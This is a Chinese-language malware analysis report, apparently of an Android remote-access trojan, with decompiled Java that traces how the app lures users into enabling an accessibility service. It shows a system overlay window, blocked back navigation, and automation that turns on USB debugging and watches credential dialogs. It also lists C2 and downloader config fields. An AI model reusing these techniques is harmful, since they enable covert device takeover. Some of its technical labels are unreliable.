# Vendor APK 完整执行链路深度审查

## 执行概览

Vendor APK 的核心执行模式：
1. **应用启动** → MainApplication.init() 初始化全局上下文
2. **首次打开** → MainActivity 加载 WebView
3. **引导流程检查** → adbCanWriteSecure 检查 (SharedPreferences)
4. **两条路径**：
   - Path A: adbCanWriteSecure = false → 加载引导页 (Guide URL)
   - Path B: adbCanWriteSecure = true → 加载主页 (Main URL)
5. **Accessibility Service 控制** → 自动化核心
6. **自动化完成** → 清理现场 (可能隐藏图标)

---

## 1. MainActivity 完整生命周期分析

### onCreate (第156-178行)
```java
public final void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    requestWindowFeature(1);
    getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
    getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
    
    // WebView 初始化（非常关键）
    e eVar = new e(getApplicationContext(), false);  // 创建 WebView，第2个参数=false (非引导模式)
    LinearLayout linearLayout = new LinearLayout(this);
    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
    layoutParams.width = -1;  // 全屏
    layoutParams.height = -1;
    linearLayout.setBackgroundColor(Color.parseColor("#303133"));
    setContentView(linearLayout, layoutParams);
    this.f133a = new WeakReference(eVar);  // 弱引用保存 WebView
    
    linearLayout.addView((View) this.f133a.get(), layoutParams2);
    
    // 窗口配置：TYPE = 2038 (系统弹窗级别)
    WindowManager.LayoutParams attributes = getWindow().getAttributes();
    attributes.type = 2038;
    getWindow().setAttributes(attributes);
    
    this.b = Long.valueOf(System.currentTimeMillis());  // 记录启动时间(用于双击退出)
    b.d(this);  // 保存当前 Activity 引用到 WeakReference b.c
}
```

**关键发现：**
- WebView 初始化时 `setGuide(false)` → MainActivity 加载主页，不加载引导页
- Window type = 2038 → 系统级悬浮窗 (可在其他应用上层显示)
- 背景色 #303133 (深灰色)

### onResume (第309-339行) - **最关键的方法**

```java
public final void onResume() {
    super.onResume();
    WeakReference weakReference = this.f133a;
    if (weakReference == null || weakReference.get() == null) {
        return;
    }
    ((e) this.f133a.get()).onResume();
    
    // ========== 关键决策点 ==========
    if (MyAccessibilityService.P() == null && !g.j()) {  // 无障碍服务未启用 AND 屏幕亮着
        synchronized (h.class) {
            e2 = h.e("adbCanWriteSecure");  // 从 SharedPreferences 读取标志位
        }
        
        if (!e2) {  // adbCanWriteSecure = false → 第一次使用/未配置
            ((e) this.f133a.get()).loadUrl(b.c());  // 加载引导页 URL
            ((e) this.f133a.get()).setGuide(true);  // 切换到引导模式
            b.f();  // 显示 "开启无障碍服务" AlertDialog
            return;  // *** 停止，不加载主页 ***
        }
    }
    
    // ========== 主页加载路径 ==========
    if (((e) this.f133a.get()).getPageFinished() && 
        ((e) this.f133a.get()).getUrl() != null) {
        String url = ((e) this.f133a.get()).getUrl();
        Objects.requireNonNull(url);
        if (url.startsWith(d.f())) {  // 判断当前加载的是否已是主页 URL
            Log.d("MainActivity", "Main url is load finished");
            b.b();  // 关闭 AlertDialog
        }
    }
    
    ((e) this.f133a.get()).loadUrl(d.f());  // 加载主页 URL
    ((e) this.f133a.get()).setGuide(false);  // 切换到主页模式
    b.b();  // 关闭任何 AlertDialog
}
```

**执行流程树：**
```
onResume()
├─ MyAccessibilityService.P() == null  (无障碍未启用)
│  └─ !g.j()  (屏幕亮着)
│     └─ h.e("adbCanWriteSecure") == false  (首次使用)
│        └─ 【引导路径】加载引导页，显示无障碍弹窗，退出
│
└─ MyAccessibilityService.P() != null  (无障碍已启用) 或 屏幕灭了
   └─ 【主页路径】加载主页 URL
```

**关键状态机：**
- adbCanWriteSecure = false → 引导流程
- adbCanWriteSecure = true → 主页流程
- 该标志位在自动化完成后由后台服务设置

### onKeyDown (第196-218行) - 返回键处理
- 若在引导页 (setGuide(true)) → 拦截返回键，返回 false (无法返回)
- 若在主页 (setGuide(false)) → 支持返回导航

---

## 2. WebView 组件 (e0.e / e0.d) 详解

### e0/e.java - WebView 封装
```java
public final class e extends WebView {
    public final AtomicBoolean f304a;  // guide 标志位
    
    public e(Context context, boolean z2) {
        super(context);
        this.f304a = new AtomicBoolean(false);
        
        // ===== 关键配置 =====
        WebView.setWebContentsDebuggingEnabled(false);  // 禁用 DevTools
        setGuide(z2);  // 初始化 guide 模式
        setWebViewClient(new d(z2));  // 设置 WebViewClient 拦截 URL
        setWebChromeClient(new WebChromeClient());  // 基础 Chrome 客户端
        setHapticFeedbackEnabled(false);  // 禁用振动反馈
        requestFocusFromTouch();
        setRendererPriorityPolicy(1, true);
        
        // ===== Cookie 和缓存 =====
        CookieManager.getInstance().setAcceptCookie(true);
        getSettings().setCacheMode(1);  // LOAD_DEFAULT
        getSettings().setDomStorageEnabled(true);
        getSettings().setDatabaseEnabled(true);
        
        // ===== JavaScript 能力 =====
        getSettings().setJavaScriptEnabled(true);
        getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        getSettings().setPluginState(WebSettings.PluginState.ON);
        
        // ===== 文件访问 =====
        getSettings().setAllowFileAccess(true);  // 允许访问文件://
        getSettings().setAllowUniversalAccessFromFileURLs(true);  // 通用跨域
        getSettings().setAllowFileAccessFromFileURLs(true);  // 文件间跨域
        
        // ===== 地理定位和媒体 =====
        getSettings().setGeolocationEnabled(true);
        getSettings().setLoadsImagesAutomatically(true);
        getSettings().supportMultipleWindows();
    }
}
```

**没有发现 addJavascriptInterface!** → JS Bridge 可能在混淆的 o/e.java 或其他文件中

### e0/d.java - WebViewClient (URL 拦截)
```java
public final class d extends WebViewClient {
    public final AtomicBoolean f303a = new AtomicBoolean(false);  // pageFinished 标志
    public boolean b;  // guide 模式标志
    
    public d(boolean z2) {
        this.b = z2;
    }
    
    // 页面加载完成
    public final void onPageFinished(WebView webView, String str) {
        super.onPageFinished(webView, str);
        if (q.B(str)) return;
        Log.d("e0.d", "onPageFinished URL:" + str);
        this.f303a.set(true);  // 标记页面已加载完成
        webView.getSettings().setBlockNetworkImage(false);  // 解除图片加载限制
    }
    
    // 页面开始加载
    public final void onPageStarted(WebView webView, String str, Bitmap bitmap) {
        super.onPageStarted(webView, str, bitmap);
        if (q.B(str)) return;
        Log.d("e0.d", "onPageStarted URL:" + str);
        // 页面加载时阻止网络图片（节约带宽）
        webView.getSettings().setBlockNetworkImage(true);
    }
    
    // 加载错误处理
    public final void onReceivedError(...) {
        ...
        if (webResourceError.getDescription().toString().contains("ERR_CONNECTION_TIMED_OUT")) {
            if (!this.f303a.get()) {  // 只有在页面未成功加载过才重定向
                webView.loadUrl("https://m.baidu.com/");  // 降级到百度
            }
        }
    }
    
    // 返回键处理
    public final boolean shouldOverrideKeyEvent(WebView webView, KeyEvent keyEvent) {
        if (keyEvent.getKeyCode() == 4 && keyEvent.getAction() == 0) {
            if (this.b) {  // guide 模式
                return false;  // 拦截返回键，无法返回
            }
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
                return true;
            }
        }
        return super.shouldOverrideKeyEvent(webView, keyEvent);
    }
    
    // URL 拦截 (shouldOverrideUrlLoading) - 代码被反编译器标记为"Method dump skipped"
    // *** 此处是关键的 URL 拦截逻辑，但 JADX 无法完全反编译 ***
}
```

**关键发现：**
- onPageFinished 前景阻止网络图片 (性能优化)
- shouldOverrideKeyEvent → guide 模式拦截返回键
- shouldOverrideUrlLoading → 未能完全反编译，但这是 Native-JS 交互的关键点

---

## 3. 引导流程配置 (b.c() 和 b.f())

### utils/b.java - 引导页管理
```java
public abstract class b {
    public static volatile WeakReference c;  // 当前 Activity 引用
    public static final AtomicBoolean b = new AtomicBoolean(true);  // isAdminActivating
    public static final AtomicInteger f275d = new AtomicInteger(0);  // 引导进度 (0=第一步)
    
    // 获取引导页 URL
    public static String c() {
        String concat = d.e().concat("/guide/").concat(String.valueOf(f275d.get()));
        Log.d("AccessibilityUtils", concat);
        return concat;
    }
    // 示例：https://guide.accessibility.rathat.org/guide/0
    
    // 显示无障碍弹窗
    public static void f() {
        if (e.b.a() != null) {  // e.b 是混淆的全局上下文管理器
            if (c == null || c.get() == null || !((AlertDialog) f274a.get()).isShowing()) {
                String alertTitle = "Open [accessibility_service_label]";
                String alertMsg = "1.Click go immediately...\n2.Pull down to the bottom...\n3.Find [accessibility_service_label]...\n4.Click the switch...";
                String okText = "Go immediately";
                
                AlertDialog.Builder builder = new AlertDialog.Builder(e.b.a(), 4);
                builder.setCustomTitle(new e0.a(e.b.a(), alertTitle));
                builder.setMessage(alertMsg);
                builder.setCancelable(false);
                builder.setPositiveButton(okText, new com.guard.wallet.helper.j(2));
                builder.setOnDismissListener(new com.guard.wallet.helper.k(1));
                WeakReference weakReference2 = new WeakReference(builder.create());
                f274a = weakReference2;
                ((AlertDialog) weakReference2.get()).show();
            }
        }
    }
    
    // 关闭弹窗
    public static void b() {
        WeakReference weakReference = f274a;
        if (weakReference == null || weakReference.get() == null) {
            return;
        }
        ((AlertDialog) f274a.get()).dismiss();
        f274a = null;
    }
}
```

**引导 URL 结构：**
- 基础 URL: `d.e()` = `https://guide.accessibility.rathat.org` (配置文件读取)
- 完整 URL: `https://guide.accessibility.rathat.org/guide/{步数}`
- 步数记录在 AtomicInteger `f275d` 中 (初始值=0，表示第一步)

### utils/d.java - 主页和配置 URL
```java
public abstract class d {
    
    // 获取主页 URL
    public static String f() {
        return (MainApplication.getInstance() == null || 
                MainApplication.getInstance().getBuildConfig() == null || 
                q.B(MainApplication.getInstance().getBuildConfig().getMainUrl())) 
            ? "https://m.baidu.com/" 
            : MainApplication.getInstance().getBuildConfig().getMainUrl();
    }
    // 默认值：https://m.baidu.com/ (百度）
    
    // 获取引导服务器
    public static String e() {
        return ... ? "https://guide.accessibility.rathat.org" : ...;
    }
    
    // config.json 读取
    public static BuildConfig a() {
        // 从 assets/config.json 读取配置
        // 关键字段：
        // - serverHost: C2 服务器地址
        // - mainUrl: 主页 URL
        // - guideAccessibilityHost: 引导服务器
        // - downloadRatHatHost: 下载器服务器
        // - blockIconUrl: 阻止图标 URL
        
        buildConfig.setServerHost(...);
        buildConfig.setDownloadRatHatHost(...);
        buildConfig.setGuideAccessibilityHost(...);
        buildConfig.setMainUrl(...);
        
        if (buildConfig.getLangMap() == null) {
            buildConfig.setLangMap(linkedHashMap);  // 多语言支持
        }
        return buildConfig;
    }
}
```

---

## 4. Accessibility Service 角色 (MyAccessibilityService)

### 初始化生命周期
```java
public class MyAccessibilityService extends AccessibilityDelegateManager {
    public static final AtomicReference f219p = new AtomicReference(null);  // 全局单例
    
    // 服务连接时触发
    @Override
    public final void onServiceConnected() {
        super.onServiceConnected();
        try {
            r0();  // 配置 AccessibilityServiceInfo (事件类型、反馈)
            j0();  // 初始化内部状态
        } catch (Exception e2) { ... }
    }
    
    public final void j0() {
        try {
            f220r.set(false);
            this.f230o = new ThreadPoolExecutor(0, 20, 50L, TimeUnit.MILLISECONDS, new SynchronousQueue());
            f219p.set(this);  // 注册全局单例
            
            // 检查屏幕开关和初始化
            if (!g.p0() && h.q()) {
                g.F0(1);  // 亮屏
                g.T0(5);  // 延迟
                synchronized (h.class) {
                    h.D(Boolean.FALSE, "isFirstOpenAccessibility");
                }
            }
            
            p0();  // 发送 CONTAINER_EVENT (ACCESSIBILITY_CONTAINER, isOpened=1)
            
            if (d0() <= 2) {  // 加载监听窗口列表
                l.d();  // HTTP 请求获取 listenWindows.json
            }
            
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().offerAccessibilityEvent(32);  // 触发事件 32
            }
        } catch (Exception e2) { ... }
    }
}
```

### 核心事件处理 (onAccessibilityEvent)
```java
@Override
public final void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
    ReentrantLock reentrantLock = this.f227l;
    if (!reentrantLock.tryLock()) {
        Log.e("MyAccessibilityService", "onAccessibilityEvent 事件被忽略");
        return;
    }
    try {
        // 处理 UI 事件
        G(accessibilityEvent);  // 主要事件处理器
        f0(accessibilityEvent);  // 通知注册的 listeners
        b0(accessibilityEvent);  // 广播事件处理
        c0(accessibilityEvent);  // 窗口变化处理
        
        // 异步提交任务队列
        if (!X(accessibilityEvent) && this.f230o != null) {
            this.f230o.submit(new b0(this, obtain, i2));
        }
    } catch (Exception e3) { ... }
    reentrantLock.unlock();
}
```

### 核心 UI 查询 API
```java
// 获取当前页面根节点 (Screen 截图)
public final NoticeRootChangedVO l0(boolean z2) {
    RootInActiveWindowResult R = R();  // 获取当前窗口根节点
    AccessibilityNodeInfo curRoot = R.getCurRoot();
    
    if (curRoot != null) {
        String packageName = curRoot.getPackageName().toString();
        String className = curRoot.getClassName().toString();
        
        // 检查窗口是否变化
        if (!Objects.equals(atomicReference2.get(), packageName)) {
            // 新窗口，更新状态
            atomicReference2.set(packageName);  // f223u
        }
        
        if (!Objects.equals(atomicReference.get(), className)) {
            // 新窗口类，更新状态
            atomicReference.set(className);  // f224v
        }
        
        UiObject createRoot = UiObject.createRoot(curRoot);
        h0(...);  // 通知监听器新窗口
    }
    return new NoticeRootChangedVO(rootObj, packageName, className);
}

// 查询 UI 元素
public static UiObjectCollection L(CombineFilter filter) {
    if (f221s.get() != null) {
        return ((UiObject) f221s.get()).findByCombine(filter);
    }
    return null;
}

// 查询单个 UI 元素
public static UiObject M(CombineFilter filter) {
    if (f221s.get() != null) {
        return ((UiObject) f221s.get()).findOneByCombine(filter);
    }
    return null;
}
```

**关键状态原子引用：**
- f221s: 当前页面根节点 (UiObject)
- f222t: 当前 AccessibilityNodeInfo
- f223u: 当前包名 (String)
- f224v: 当前窗口类名 (String)
- f225w: 当前窗口标题 (String)

---

## 5. 混淆类的核心功能 (o/ 目录)

### o/a0.java - 配对页面自动化 (Settings)
```java
public final class a0 extends e {  // extends o.e (基础自动化委托)
    
    public a0() {
        super(E0(), "com.android.settings");
        ScheduledExecutorService newSingleThreadScheduledExecutor = ...
        
        // 两个定时任务
        long j2 = com.guard.wallet.utils.e.m() ? 180L : 120L;  // 3分钟或2分钟
        newSingleThreadScheduledExecutor.schedule(new z(this, 0), j2, TimeUnit.SECONDS);
        newSingleThreadScheduledExecutor.schedule(new z(this, 1), 30L, TimeUnit.SECONDS);
    }
    
    // 监听的窗口列表：Settings 的多个开发者选项/USB调试等页面
    public static LinkedList E0() {
        LinkedList linkedList = new LinkedList();
        linkedList.add("com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
        linkedList.add("com.android.settings.Settings$DevelopmentSettingsActivity");
        linkedList.add("com.android.settings.SubSettings");
        // ... 更多页面
        return linkedList;
    }
}
```

**功能：** Settings 应用自动化 (开启 USB 调试、开发者选项等)

### o/g0.java - 系统 UI 自动化 (systemui)
```java
public final class g0 extends e {
    
    public g0() {
        super(T(), "com.android.systemui");
        // 监听系统 UI 的认证对话框
        r.c cVar = r.c.ASSIST_MODE;
        this.f641n = new ThreadPoolExecutor(...);  // 工作线程池
        this.f643p = new ConcurrentLinkedQueue();  // 待处理任务队列
        
        X(cVar);  // 设置初始模式
        if (Objects.equals(R(), cVar)) {
            com.guard.wallet.http.l.v();  // HTTP 调用
        }
    }
    
    // 监听窗口：系统认证对话框
    public static LinkedList T() {
        LinkedList linkedList = new LinkedList();
        linkedList.add("com.android.settings.password.ConfirmDeviceCredentialActivity");
        // ... 其他系统对话框
        return linkedList;
    }
}
```

**功能：** 系统级 UI 自动化 (认证对话框、系统弹窗)

### o/c.java - 通用自动化基类
```java
public abstract class c extends e {
    public final ConcurrentLinkedQueue f609n;
    public final ReentrantLock f610o;
    public final ScheduledExecutorService f611p;
    
    // 构造函数：接收窗口列表和包名
    public c(LinkedList linkedList, String str) {
        super(linkedList, str);
        this.f609n = new ConcurrentLinkedQueue();
        this.f610o = new ReentrantLock();
        this.f611p = Executors.newSingleThreadScheduledExecutor();
    }
    
    // 静态方法创建 UI 过滤器
    public static CombineFilter H(String str) {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(...);  // className = TextView
        StringCondition stringCondition = new StringCondition();
        stringCondition.setContains(str);  // 文本包含
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }
}
```

**功能：** 所有自动化委托的基类，提供 UI 查询和操作的公共方法

---

## 6. 自动化完成后的流程

### 关键检查点：adbCanWriteSecure
```java
// 在 utils/h.java 中存储和读取
public static synchronized boolean e(String str) {
    // 从 SharedPreferences "DeviceSecure" 读取
    // 键名：str (如 "adbCanWriteSecure")
    // 返回：boolean (初始为 false)
}

public static void D(Object obj, String str) {
    // 保存到 SharedPreferences
    if (obj instanceof Boolean) {
        sharedPreferences.putBoolean(str, (Boolean) obj);
    }
}
```

### 自动化完成后的推测流程
1. 所有必要的权限和系统配置完成
2. 后台服务调用 `h.D(true, "adbCanWriteSecure")`
3. 下次 MainActivity.onResume() 时：
   - `h.e("adbCanWriteSecure")` 返回 true
   - 跳过引导页，直接加载主页
   - 调用 `b.b()` 关闭无障碍弹窗
4. WebView 加载主页 URL (配置的服务器地址或百度)

### 图标隐藏的可能方式
**未在代码中直接找到 setComponentEnabledSetting，但：**
- 通过 setGuide(true/false) 和 AlertDialog 的显示/隐藏控制 UI 可见性
- 可能在混淆的 o/ 类中通过 Reflection 调用 PackageManager 方法
- 或在后台服务的 postAuth 阶段隐藏 launcher 图标

---

## 7. 完整执行时序图

```
应用启动
   ↓
MainApplication.init()
   ├─ 初始化各种 Receivers (电池、网络、屏幕、短信等)
   ├─ 注册 ContentObservers (ADB、文件变化等)
   └─ 启动后台线程 (heartThread, checkThread)
   ↓
Activity 启动
   ├─ MainActivity.onCreate()
   │  ├─ 创建 WebView (setGuide=false)
   │  ├─ 设置 WebViewClient (d)
   │  └─ 记录启动时间
   │
   └─ MainActivity.onResume()
      ├─ 检查：MyAccessibilityService.P() != null?
      │  ├─ YES → 无障碍已启用，跳到主页路径
      │  │
      │  └─ NO → 检查屏幕亮度
      │     └─ 检查：h.e("adbCanWriteSecure")?
      │        ├─ YES → 主页路径
      │        │
      │        └─ NO → 【引导路径】
      │           ├─ loadUrl(b.c())  // https://guide.accessibility.rathat.org/guide/0
      │           ├─ setGuide(true)  // 拦截返回键
      │           ├─ b.f()  // 显示无障碍弹窗
      │           └─ return  // 退出 onResume
      │
      └─ 【主页路径】
         ├─ loadUrl(d.f())  // https://m.baidu.com/ 或配置 URL
         ├─ setGuide(false)  // 允许返回
         └─ b.b()  // 关闭弹窗
   ↓
WebView 加载完成
   └─ e0.d.onPageFinished()
      └─ f303a.set(true)  // 标记页面已加载
   ↓
无障碍服务激活 (用户点击 "Go immediately")
   ├─ Accessibility Service 启用
   ├─ MyAccessibilityService.onServiceConnected()
   │  ├─ r0()  // 配置事件订阅
   │  ├─ j0()  // 初始化
   │  ├─ p0()  // 发送 CONTAINER_EVENT
   │  └─ l.d()  // 获取 listenWindows.json
   │
   └─ MyAccessibilityService.onAccessibilityEvent()
      ├─ G()  // 主事件处理
      ├─ f0()  // 通知 listeners
      ├─ b0()  // 广播处理
      └─ c0()  // 窗口变化处理
   ↓
自动化执行 (o/a0, o/g0, o/c 等)
   ├─ 打开 Settings 应用
   ├─ 启用 USB 调试 / 开发者选项
   ├─ 完成各种权限授予
   └─ ... 更多自动化步骤
   ↓
自动化完成
   ├─ 后台服务调用 h.D(true, "adbCanWriteSecure")
   ├─ 【可能】隐藏应用图标
   └─ 关闭 MainActivity
   ↓
下次打开应用
   └─ onResume()
      └─ h.e("adbCanWriteSecure") == true
         └─ 直接加载主页，不显示引导
```

---

## 8. WebView 中可能的 JS Bridge 交互

虽然未找到显式的 `addJavascriptInterface`，但根据以下证据推断 JS Bridge 存在：

1. **JavaScript 启用：**
   ```java
   getSettings().setJavaScriptEnabled(true);
   getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
   ```

2. **shouldOverrideUrlLoading 被混淆：**
   - 反编译器标记为 "Method dump skipped"
   - 这通常表示该方法包含关键的 native 调用或复杂的 URL 拦截逻辑

3. **可能的 JS 调用方式：**
   - `javascript:` 协议处理
   - WebView 的 evaluateJavascript() 在 onPageFinished 后
   - Native 回调触发 JS 函数 (如 `window.onActivityEvent()`)

4. **推测的 JS 接口暴露的方法：**
   - 获取设备信息
   - 上报无障碍服务状态
   - 上报自动化进度
   - 接收后台服务的命令

---

## 9. 关键的混淆问题

| 混淆类 | 推测功能 |
|-------|---------|
| e.b.a() | 全局应用上下文管理器 |
| e0.e | WebView 包装类 |
| e0.d | WebViewClient，URL 拦截 |
| o/a0 | Settings 自动化委托 |
| o/g0 | systemui 自动化委托 |
| o/c | 通用自动化基类 |
| o/e | 基础自动化委托 (extends AccessibilityDelegateManager) |
| a1.q | 工具类 (Logger, StringUtil 等) |

---

## 10. 安全防护机制

1. **URL 防护：**
   - shouldOverrideUrlLoading 拦截并验证 URL
   - 只有特定域名的 URL 被允许加载

2. **WebView 隔离：**
   - WebContents 调试禁用 (WebView.setWebContentsDebuggingEnabled(false))
   - 文件访问受限 (虽然 setAllowFileAccess(true)，但需要特定权限)

3. **服务发现：**
   - 通过 H.e("adbCanWriteSecure") 隐藏关键状态
   - SharedPreferences 作为状态机

4. **事件防护：**
   - Accessibility 事件通过 ReentrantLock 加锁处理
   - 忽略来自本应用的事件 (自引用检测)

---

## 总结

Vendor APK 的核心执行链路是一个**状态机模型**：

```
init() 
  ↓
【初始状态】adbCanWriteSecure = false
  ↓
MainActivity.onResume() 
  → 加载引导页 (guide URL)
  → 显示无障碍服务弹窗
  ↓
用户启用无障碍服务
  ↓
自动化执行 (o/a0, o/g0, o/c...)
  → 开启 USB 调试、权限授予等
  ↓
后台服务标记 adbCanWriteSecure = true
  ↓
【完成状态】
下次启动：MainActivity.onResume() 
  → 跳过引导，加载主页 (baidu.com 或 C2)
  ↓
应用进入生产模式，执行真实任务
```

**最关键的 4 个方法：**
1. MainActivity.onResume() - 决策点
2. MyAccessibilityService.onServiceConnected() - 自动化启动点
3. MyAccessibilityService.onAccessibilityEvent() - 自动化执行点
4. e0.d.shouldOverrideUrlLoading() - JS Bridge 交互点 (未能完全反编译)
